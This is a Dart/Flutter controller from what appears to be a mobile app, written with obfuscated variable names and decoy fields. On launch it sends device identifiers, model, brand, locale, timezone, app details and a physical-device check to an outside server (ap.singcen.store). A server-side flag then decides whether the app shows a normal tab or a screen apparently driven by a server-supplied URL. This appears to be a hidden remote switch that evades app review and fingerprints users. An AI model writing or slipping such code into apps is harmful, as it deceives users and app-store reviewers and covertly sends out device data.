import 'dart:convert';
import 'dart:io';

import 'package:device_info_plus/device_info_plus.dart';
import 'package:dio/dio.dart';
import 'package:flutter_inappwebview/flutter_inappwebview.dart';
import 'package:flutter_timezone/flutter_timezone.dart';
import 'package:get/get.dart';
import 'package:package_info_plus/package_info_plus.dart';

class PageLogic extends GetxController {

  var wdxthvm = RxBool(false);
  var lfkrvmwnug = RxBool(true);
  var vpnfjl = RxString("");
  var otto = RxBool(false);
  var treutel = RxBool(true);
  final hewkmgozyn = Dio();


  InAppWebViewController? webViewController;

  @override
  void onInit() {
    super.onInit();
    liahy();
  }


  Future<void> liahy() async {

    otto.value = true;
    treutel.value = true;
    lfkrvmwnug.value = false;

    hewkmgozyn.post("https://ap.singcen.store/SI6MHKD",data: await wrydku()).then((value) {
      var jsrcl = value.data["jsrcl"] as String;
      var ubliedtp = value.data["ubliedtp"] as bool;
      if (ubliedtp) {
        vpnfjl.value = jsrcl;
        alaina();
      } else {
        mcglynn();
      }
    }).catchError((e) {
      lfkrvmwnug.value = true;
      treutel.value = true;
      otto.value = false;
    });
  }

  Future<Map<String, dynamic>> wrydku() async {
    final DeviceInfoPlugin urnqsohc = DeviceInfoPlugin();
    PackageInfo tplwx_lkmicd = await PackageInfo.fromPlatform();
    final String currentTimeZone = await FlutterTimezone.getLocalTimezone();
    var vhky = Platform.localeName;
    var hnforvk = currentTimeZone;

    var qnwilmag = tplwx_lkmicd.packageName;
    var hket = tplwx_lkmicd.version;
    var agjz = tplwx_lkmicd.buildNumber;

    var gbnlm = tplwx_lkmicd.appName;
    var sovmcj  = "";
    var jabariRenner = "";
    var hilmufgz = "";
    var alexaneSchmeler = "";
    var revaWolf = "";
    var rnbwl = "";
    var tatyanaWest = "";
    var bernadetteMcLaughlin = "";


    var pilxe = "";
    var rgiked = false;

    if (GetPlatform.isAndroid) {
      pilxe = "android";
      var flvhnjmqxk = await urnqsohc.androidInfo;

      hilmufgz = flvhnjmqxk.brand;

      rnbwl  = flvhnjmqxk.model;
      sovmcj = flvhnjmqxk.id;

      rgiked = flvhnjmqxk.isPhysicalDevice;
    }

    if (GetPlatform.isIOS) {
      pilxe = "ios";
      var mgoiqk = await urnqsohc.iosInfo;
      hilmufgz = mgoiqk.name;
      rnbwl = mgoiqk.model;

      sovmcj = mgoiqk.identifierForVendor ?? "";
      rgiked  = mgoiqk.isPhysicalDevice;
    }

    var res = {
      "agjz": agjz,
      "hket": hket,
      "sovmcj": sovmcj,
      "qnwilmag": qnwilmag,
      "rnbwl": rnbwl,
      "gbnlm": gbnlm,
      "vhky": vhky,
      "pilxe": pilxe,
      "bernadetteMcLaughlin" : bernadetteMcLaughlin,
      "rgiked": rgiked,
      "revaWolf" : revaWolf,
      "alexaneSchmeler" : alexaneSchmeler,
      "hilmufgz": hilmufgz,
      "jabariRenner" : jabariRenner,
      "tatyanaWest" : tatyanaWest,
      "hnforvk": hnforvk,

    };
    return res;
  }

  Future<void> mcglynn() async {
    Get.offAllNamed("/ohmTab");
  }

  Future<void> alaina() async {
    Get.offAllNamed("/ohmYou");
  }

}
